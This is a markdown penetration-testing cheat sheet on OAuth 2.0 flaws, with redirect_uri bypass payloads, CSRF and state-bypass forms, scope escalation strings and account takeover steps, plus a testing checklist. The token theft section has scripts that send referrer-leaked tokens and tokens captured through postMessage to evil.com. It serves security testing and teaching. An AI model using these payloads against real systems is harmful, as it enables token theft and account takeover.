# OAuth Vulnerabilities

## Table of Contents

- [Overview](#overview)
- [OAuth Flow Types](#oauth-flow-types)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Token Theft](#token-theft)
- [Open Redirect Exploitation](#open-redirect-exploitation)
- [CSRF in OAuth](#csrf-in-oauth)
- [State Parameter Bypass](#state-parameter-bypass)
- [Scope Manipulation](#scope-manipulation)
- [Testing Checklist](#testing-checklist)

---

## Overview

OAuth 2.0 is an authorization framework that enables applications to obtain limited access to user accounts. Misconfigurations lead to account takeover, token theft, and unauthorized access.

**Key Components:**

- **Resource Owner** - User who owns the data
- **Client** - Application requesting access
- **Authorization Server** - Issues tokens
- **Resource Server** - Hosts protected resources

---

## OAuth Flow Types

### Authorization Code Flow

```text
1. Client redirects user to Authorization Server
2. User authenticates and consents
3. Authorization Server returns code to redirect_uri
4. Client exchanges code for access_token (server-side)
5. Client uses access_token to access resources
```

### Implicit Flow (Deprecated)

```text
1. Client redirects user to Authorization Server
2. User authenticates and consents
3. Authorization Server returns access_token directly in URL fragment
```

### Key Parameters

| Parameter | Description |
| :--- | :--- |
| `client_id` | Public identifier for the client |
| `redirect_uri` | Where to send the authorization code/token |
| `response_type` | `code` (Auth Code) or `token` (Implicit) |
| `scope` | Requested permissions |
| `state` | CSRF protection token |

---

## Common Vulnerabilities

### 1. Redirect URI Manipulation

> Test redirect_uri bypass

```text
# Subdomain takeover
redirect_uri=https://evil.legitimate.com/callback

# Open redirect chain
redirect_uri=https://legitimate.com/redirect?url=https://evil.com

# Path traversal
redirect_uri=https://legitimate.com/callback/../evil

# Parameter pollution
redirect_uri=https://legitimate.com/callback&redirect_uri=https://evil.com

# Fragment bypass
redirect_uri=https://legitimate.com/callback#@evil.com

# URL encoding
redirect_uri=https://legitimate.com%40evil.com

# Different schemes
redirect_uri=http://legitimate.com/callback  # Downgrade to HTTP
```

### 2. Insufficient redirect_uri Validation

```text
# Allowed: https://example.com/callback
# Try:
https://example.com/callback/..
https://example.com/callback?next=evil.com
https://example.com/callbackevil.com
https://example.com/callback.evil.com
https://example.com.evil.com/callback
```

---

## Token Theft

### Via Referrer Header

> If token in URL, may leak via Referrer

```html
<!-- On attacker page after redirect -->
<script>
// Token leaked in document.referrer
fetch('https://evil.com/steal?ref=' + document.referrer);
</script>
```

### Via Browser History

> Implicit flow tokens in URL fragment

```javascript
// Token may persist in browser history
location.hash  // Contains access_token
```

### Via Postmessage

> If parent window receives token via postMessage

```html
<iframe src="https://target.com/oauth/callback"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch('https://evil.com/steal?token=' + e.data.access_token);
});
</script>
```

---

## Open Redirect Exploitation

### Chain Open Redirect with OAuth

> Step 1: Find open redirect

```text
https://target.com/redirect?url=https://evil.com
```

> Step 2: Use in OAuth flow

```text
https://auth.target.com/authorize?
  client_id=xxx&
  redirect_uri=https://target.com/redirect?url=https://evil.com&
  response_type=token
```

> Step 3: Token sent to attacker

```text
User clicks â†’ Auth â†’ Redirect to evil.com#access_token=xxx
```

---

## CSRF in OAuth

### Authorization Endpoint CSRF

> Force user to authorize attacker's client

```html
<img src="https://target.com/oauth/authorize?client_id=ATTACKER_APP&redirect_uri=...&response_type=code&scope=read" />
```

### Missing State Parameter

> If state parameter not validated

```html
<!-- Attach victim account to attacker OAuth -->
<iframe src="https://target.com/oauth/callback?code=ATTACKER_CODE"></iframe>
```

### Login CSRF via OAuth

> Force victim to login as attacker

```html
<form action="https://target.com/oauth/callback" method="GET">
    <input type="hidden" name="code" value="ATTACKER_AUTH_CODE" />
</form>
<script>document.forms[0].submit();</script>
```

---

## State Parameter Bypass

### Empty State

```text
state=
state=null
state=undefined
```

### State Fixation

```text
# If state can be reused
1. Start OAuth flow, get state=ABC
2. Don't complete flow
3. Trick victim to use state=ABC
4. Use victim's code with state=ABC
```

### State Tampering

```text
# If state not properly validated
state=attacker_controlled_value
state=../../path
state="><script>alert(1)</script>
```

---

## Scope Manipulation

### Scope Upgrade

> Request more permissions than allowed

```text
scope=read â†’ scope=read write admin
scope=email â†’ scope=email+admin
```

### Scope Injection

```text
scope=email%20admin
scope=email%0aadmin
scope=email,admin
```

### Scope Bypass

> Application may not verify granted scopes

```text
1. Request: scope=read
2. Granted: scope=read
3. Try accessing admin endpoints anyway
```

---

## Account Takeover Scenarios

### OAuth Login Without Email Verification

```text
1. Attacker creates OAuth account with victim's email
2. Victim tries to login
3. Account linked to attacker's OAuth
```

### Linking Existing Account

```text
1. Victim has account (email/password)
2. Attacker links their OAuth to victim's email
3. Attacker can login via OAuth
```

### Pre-Account Takeover

```text
1. Attacker creates account with victim@target.com
2. Victim registers via OAuth (same email)
3. Accounts may merge, giving attacker access
```

---

## Testing Checklist

### redirect_uri Testing

- [ ] Subdomain variations
- [ ] Path manipulation (../, /..)
- [ ] Parameter pollution
- [ ] URL encoding bypass
- [ ] Open redirect chains
- [ ] Scheme change (https â†’ http)
- [ ] localhost/127.0.0.1 allowed?

### State Parameter Testing

- [ ] Missing state parameter
- [ ] Empty state accepted
- [ ] State reuse possible
- [ ] State not bound to session
- [ ] State value predictable

### Token Security Testing

- [ ] Token in URL (Implicit flow)
- [ ] Token leakage via Referrer
- [ ] Token storage (localStorage vs cookies)
- [ ] Token expiration
- [ ] Refresh token rotation

### General Testing

- [ ] Scope enforcement
- [ ] Client secret exposure
- [ ] Race conditions in token exchange
- [ ] PKCE implementation (for public clients)

---

## Tools

| Tool | Description |
| :--- | :--- |
| Burp Suite | Intercept and modify OAuth requests |
| oauth2-security-scanner | Automated OAuth vulnerability scanner |
| recon-ng | Enumerate OAuth endpoints |

---

## Quick Reference

### Attack Scenarios

| Vulnerability | Impact |
| :--- | :--- |
| redirect_uri bypass | Token theft, account takeover |
| Missing state | CSRF, account linking |
| Scope escalation | Privilege escalation |
| Token leakage | Account takeover |
| Open redirect chain | Token theft |

### Payload Templates

```text
# redirect_uri manipulation
redirect_uri=https://evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com%2f%2f@evil.com
redirect_uri=https://target.com/callback?next=https://evil.com

# State bypass
state=
state=anything
&state=attacker

# Scope escalation
scope=read%20write%20admin
scope=read+admin
```

---

## ðŸ“š See Also

### Related Web Attacks

- **[CSRF](7.11.CSRF.md)** - CSRF in OAuth flows
- **[SSRF](7.5.SSRF.md)** - Token theft via SSRF
- **[JWT Attacks](7.15.JWT-Attacks.md)** - Token manipulation techniques
